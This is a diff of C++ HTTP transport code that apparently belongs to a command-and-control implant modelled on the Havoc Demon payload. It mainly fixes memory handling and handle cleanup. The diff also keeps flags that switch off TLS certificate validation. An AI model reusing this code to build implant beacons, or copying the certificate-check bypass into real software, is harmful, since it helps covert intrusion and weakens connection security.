@@ -15,25 +15,45 @@ namespace Network {
 
             do {
                 if (!Ctx->win32.WinHttpQueryDataAvailable(request, &length)) {
+                    if (download) {
+                        Free(download);
+                    }
                     return false;
                 }
 
-                if (!buffer) { buffer = Malloc(length + 1); }
-                if (!download) { download = Malloc(length + 1); }
-                else { download = Realloc(download, total + length + 1); }
+                if (!buffer) {
+                    buffer = Malloc(length + 1);
+                }
+
+                if (!download) {
+                    download = Malloc(length + 1);
+                }
+                else {
+                    void *r_download = Realloc(download, total + length + 1);
+
+                    if (!r_download) {
+                        Zerofree(download, length + 1);
+                        return false;
+                    }
+
+                    download = r_download;
+                }
 
                 MemSet(buffer, 0, length + 1);
+
                 if (!Ctx->win32.WinHttpReadData(request, buffer, length, &read)) {
+                    Zerofree(download, read);
                     return false;
                 }
 
                 MemCopy(B_PTR(download) + total, buffer, read);
                 Zerofree(buffer, read);
-
                 total += read;
+
             } while (length > 0);
 
-            (*stream)           = (_stream*) Malloc(sizeof(_stream));
+            *stream = (_stream*) Malloc(sizeof(_stream));
+
             (*stream)->buffer   = B_PTR(download);
             (*stream)->length   = total;
 
@@ -75,6 +95,7 @@ namespace Network {
             }
 
             if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(handle, address, port, 0))) {
+                Ctx->nt.NtClose(handle);
                 return false;
             }
 
@@ -87,6 +108,7 @@ namespace Network {
             if (Ctx->transport.b_ssl) {
                 flags |= WINHTTP_FLAG_SECURE;
             }
+
             if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, method, endpoint, nullptr, nullptr, nullptr, flags))) {
                 return false;
             }
@@ -177,14 +199,13 @@ namespace Network {
             // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/transportHttp.c#L21
             // todo: reverting tokens during http operations
 
-            bool success = true;
             _proxy_context proxy_ctx = { };
             _request_context req_ctx = { };
 
-            uint32_t status  = 0;
-            DWORD n_status   = sizeof(uint32_t);
+            uint32_t status = 0;
+            DWORD n_status  = sizeof(uint32_t);
+            bool success    = true;
 
-            auto ssl_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
             wchar_t *methods[] = {
                 (wchar_t*)L"GET",
                 (wchar_t*)L"POST"
@@ -198,8 +219,10 @@ namespace Network {
             }
 
             const auto handle = req_ctx.req_handle;
+
             if (Ctx->transport.b_ssl) {
-                x_assertb(Ctx->win32.WinHttpSetOption(handle, WINHTTP_OPTION_SECURITY_FLAGS, &ssl_flags, sizeof(ULONG)));
+                auto sec_flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+                x_assertb(Ctx->win32.WinHttpSetOption(handle, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(ULONG)));
             }
 
             if (Ctx->transport.http->headers) {
